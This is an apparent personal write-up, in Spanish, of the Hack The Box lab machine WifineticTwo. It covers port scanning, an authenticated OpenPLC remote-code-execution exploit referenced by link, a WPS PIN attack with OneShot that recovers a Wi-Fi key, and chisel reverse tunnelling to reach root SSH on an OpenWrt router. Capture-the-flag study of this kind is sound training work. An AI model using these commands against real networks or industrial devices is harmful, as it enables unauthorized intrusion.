@@ -1,0 +1,232 @@
+WifineticTwo - Medium
+
+Discovery
+
+Host is up (0.054s latency).
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
+| http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_Requested resource was http://10.129.211.160:8080/login
+|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 NOT FOUND
+|     content-type: text/html; charset=utf-8
+|     content-length: 232
+|     vary: Cookie
+|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZqAlwA.MMurSDN2o6nA95vDMj-9UnYiu_k; Expires=Tue, 23-Jul-2024 21:55:56 GMT; HttpOnly; Path=/
+|     server: Werkzeug/1.0.1 Python/2.7.18
+|     date: Tue, 23 Jul 2024 21:50:56 GMT
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+|     <title>404 Not Found</title>
+|     <h1>Not Found</h1>
+|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+|   GetRequest: 
+|     HTTP/1.0 302 FOUND
+|     content-type: text/html; charset=utf-8
+|     content-length: 219
+|     location: http://0.0.0.0:8080/login
+|     vary: Cookie
+|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZqAlvw.nz_3E1f33drcr2vUc8rGbQafbd8; Expires=Tue, 23-Jul-2024 21:55:55 GMT; HttpOnly; Path=/
+|     server: Werkzeug/1.0.1 Python/2.7.18
+|     date: Tue, 23 Jul 2024 21:50:55 GMT
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+|     <title>Redirecting...</title>
+|     <h1>Redirecting...</h1>
+|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     content-type: text/html; charset=utf-8
+|     allow: HEAD, OPTIONS, GET
+|     vary: Cookie
+|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZqAlwA.MMurSDN2o6nA95vDMj-9UnYiu_k; Expires=Tue, 23-Jul-2024 21:55:56 GMT; HttpOnly; Path=/
+|     content-length: 0
+|     server: Werkzeug/1.0.1 Python/2.7.18
+|     date: Tue, 23 Jul 2024 21:50:56 GMT
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad request
+|     content-length: 90
+|     cache-control: no-cache
+|     content-type: text/html
+|     connection: close
+|     <html><body><h1>400 Bad request</h1>
+|     Your browser sent an invalid request.
+|_    </body></html>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+pruebo a entrar nos aparece un OpenPLC Webserver
+
+en principio no encuentro nada con gobuster
+
+https://www.exploit-db.com/exploits/49803
+
+con searhsploit hay algo interesante authenticado
+
+Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+OpenPLC 3 - Remote Code Execution (Authenticated)                                                                                   | python/webapps/49803.py
+
+ambos parecen ser el mismo exploit, entonces busco credenciales por defecto
+
+pruebo en firefox y no soy capaz de entrar y en chromium si
+
+viendo un poco por internet deberemos probar a logearnos desde chromium
+
+https://raw.githubusercontent.com/Hunt3r0x/CVE-2021-31630-HTB/main/exploit.py
+
+probaremos otro cve dado que los otros nos daban problemas
+
+Finalmente modifico y arreglo scripts y llegamos a la flag de user
+https://github.com/manuelsantosiglesias/CVE-2021-31630
+
+--------------
+
+La máquina ahora es un poco extraña estoy como root pero tengo la flag de user
+
+Existe un usuario Ubuntu
+
+aparece un interfaz Wifi
+
+wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+con algo de ayuda me indican de buscar conectarme a una Wifi
+
+y según parece necesito esto
+
+https://github.com/kimocoder/OneShot/blob/master/oneshot.py
+
+./oneshot.py -i wlan0 -K
+./oneshot.py -i wlan0 -K
+[*] Running wpa_supplicant…
+[*] BSSID not specified (--bssid) — scanning for available networks
+Networks list:
+#    BSSID              ESSID                     Sec.     PWR  WSC device name             WSC model
+1)   02:00:00:00:01:00  plcrouter                 WPA2     -30         
+
+[*] Received WPS Message M5
+[+] The first half of the PIN is valid
+[*] Sending WPS Message M6…
+[*] Received WPS Message M7
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
+[+] AP SSID: 'plcrouter'
+
+network={
+    ssid="plcrouter"
+    psk="NoWWEDoKnowWhaTisReal123!"
+}
+
+Finalmente cambié cosillas que se colgaba la máquina
+
+/etc/wpa_supplicant/wpa_supplicant-wlan0.conf
+
+ctrl_interface=/var/run/wpa_supplicant
+ctrl_interface_group=0
+update_config=1
+
+network={
+  ssid="plcrouter"
+  psk="NoWWEDoKnowWhaTisReal123!"
+  key_mgmt=WPA-PSK
+  proto=WPA2
+  pairwise=CCMP TKIP
+  group=CCMP TKIP
+  scan_ssid=1
+}
+
+/etc/systemd/network/25-wlan.network
+
+[Match]
+Name=wlan0
+
+[Network]
+DHCP=ipv4
+
+Y por último
+
+systemctl enable wpa_supplicant@wlan0.service
+systemctl restart systemd-networkd.service
+systemctl restart wpa_supplicant@wlan0.service
+
+Se me vuelve a colgar el sistema pruebo de otra manera
+
+primero cambio el archivo
+
+wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config
+/tmp/config
+network={
+	ssid="plcrouter"
+	#psk="NoWWEDoKnowWhaTisReal123!"
+	psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
+}
+
+wpa_supplicant -B -c config -i wlan0
+
+ifconfig wlan0 192.168.0.10 netmask 255.255.0.0
+
+hago un pequeño script en bash que dejo en script y voilá
+
+root@attica01:/tmp# ./ping.sh
+./ping.sh
+192.168.0.10 is reachable
+192.168.1.1 is reachable
+
+hacemos lo mismo con puertos
+
+./ports.sh 192.168.1.1
+Puerto 22 está abierto en 192.168.1.1
+Puerto 53 está abierto en 192.168.1.1
+Puerto 80 está abierto en 192.168.1.1
+Puerto 443 está abierto en 192.168.1.1
+
+y hay un servidor web y un ssh
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+		<meta http-equiv="Pragma" content="no-cache" />
+                <meta http-equiv="Expires" content="0" />
+		<meta http-equiv="refresh" content="0; URL=cgi-bin/luci/" />
+		<style type="text/css">
+			body { background: white; font-family: arial, helvetica, sans-serif; }
+			a { color: black; }
+
+			@media (prefers-color-scheme: dark) {
+				body { background: black; }
+				a { color: white; }
+			}
+		</style>
+	</head>
+	<body>
+		<a href="cgi-bin/luci/">LuCI - Lua Configuration Interface</a>
+	</body>
+</html>
+
+nos aparece la interfaz de openwrt
+
+pruebo con el ssh
+
+me sale un problema así que acabo haciendo pivoting
+
+En mi pc
+./chisel server -p 8000 --reverse
+en la victima
+./chisel client MI_IP:8000 R:1234:192.168.1.1:22
+
+despues en mi pc sencillamente hago ssh -p 1234 root@localhost y ya tengo acceso a la flag de root
+
+La parte de la wifi se me complicó un poco y el pivoting también pero al final se consiguió.
